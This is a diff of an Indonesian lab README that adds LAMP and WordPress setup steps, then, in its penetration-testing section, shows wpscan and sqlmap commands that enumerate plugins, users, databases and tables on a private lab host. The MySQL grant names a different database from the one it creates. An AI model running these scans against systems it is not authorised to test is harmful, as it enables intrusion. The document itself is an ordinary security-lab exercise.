@@ -70,8 +70,66 @@ $ sudo mysql_secure_installation
 ```
 
 **3. Install PHP**
-
-
+Selanjutnya untuk menginstall PHP menggunakan comamnd berikut
+```
+$ sudo apt-get install php7.0 php7.0-mysql libapache2-mod-php7.0 php7.0-cli php7.0-cgi php7.0-gd
+```
+selanjutnya untuk mengetest apakah PHP sudah berjalan dengan command berikut
+```
+$ sudo vi /var/www/html/info.php
+```
+Masukan command pada file yang dibuka lewat vi
+```
+<?php
+phpinfo();
+?>
+```
+Setelah itu buka pada client browser dan masukan link ini http://server_address/info.php
+maka akan muncul seperti gambah dibawah
+![gambar1](Screenshot/PHP.png)
+**4. Install Wordpress**
+Setelah step sebelumnya di intall semua terlebih dahulu sekarang kami akan melakukan penginstall wordpress pertama kami mendownload dan mengextract terlebih dahulu
+```
+$ wget -c http://wordpress.org/latest.tar.gz
+$ tar -xzvf latest.tar.gz
+```
+kemudian file kami pindahkan
+```
+$ sudo rsync -av wordpress/* /var/www/html/
+```
+kemudian melakukan setting permission
+```
+$ sudo chown -R www-data:www-data /var/www/html/
+$ sudo chmod -R 755 /var/www/html/
+```
+**5. Membuat Wordpress database**
+Masukan command ini
+```
+$ mysql -u root -p
+```
+kemudian masukan command ini untuk membuat database
+```
+mysql> CREATE DATABASE wp_pksj;
+mysql> GRANT ALL PRIVILEGES ON wp_myblog.* TO 'your_username_here'@'localhost' IDENTIFIED BY 'your_chosen_password_here';
+mysql> FLUSH PRIVILEGES;
+mysql> EXIT;
+```
+kemudian menuju ke /var/www/html/ untuk me-rename file
+```
+$ sudo mv wp-config-sample.php wp-config.php
+```
+kemudian restart untuk menjalankan wordpress
+```
+$ sudo systemctl restart apache2.service
+$ sudo systemctl restart mysql.service
+```
+hasil wordpress dibuka pada client
+![gambar1](Screenshot/1.jpg)
+![gambar1](Screenshot/2.jpg)
+![gambar1](Screenshot/3.jpg)
+![gambar1](Screenshot/4.jpg)
+![gambar1](Screenshot/5.jpg)
+![gambar1](Screenshot/6.jpg)
 
 ## D. Uji Penetrasi
 **1. Uji penetrasi dengan wpscan**
@@ -79,7 +137,7 @@ Untuk uji penestasi pertama kita melakukan menggunakan wp scan untuk mengecek pl
 ```
 wpscan --url localhost/wordpress
 ```
-![gambar1](Screenshot/plugin.jpg)
+![gambar1](Screenshot/Plugin.jpg)
 
 Selanjutnya mengecek username menggunakan wpscan dengan command dibawah
 ```
@@ -98,16 +156,16 @@ Selanjutnya kami mencoba uji penetrasi menggunakan sqlmap pada plugin leaguemana
 sqlmap --url "http://192.168.159.130/wp" --level 5 --risk 3 --dbms mysql
 ```
 dari command ini kita mendapatkan OS, Webserver dan versi dbms yang diguankan
-![gambar1](Screenshot/Uji1.1.jpg)
+![gambar1](Screenshot/uji1.1.jpg)
 ```
 sqlmap --url "http://192.168.159.130/wp" --level 5 --risk 3 --dbms mysql --dbs
 ```
 dari command ini kita mendapat database yang terdapat pada target penetrasi
-![gambar1](Screenshot/Uji1.2.jpg)
+![gambar1](Screenshot/uji1.2.jpg)
 ```
 sqlmap --url "http://192.168.159.130/wp" --level 5 --risk 3 --dbms mysql -D wordpress --tables
 ```
 dari command ini kita mendapatkan tabel apa saja yang terdapat pada wordpress
-![gambar1](Screenshot/Uji1.3.jpg)
+![gambar1](Screenshot/uji1.3.jpg)
 
 ## E. Kesimpulan dan Saran
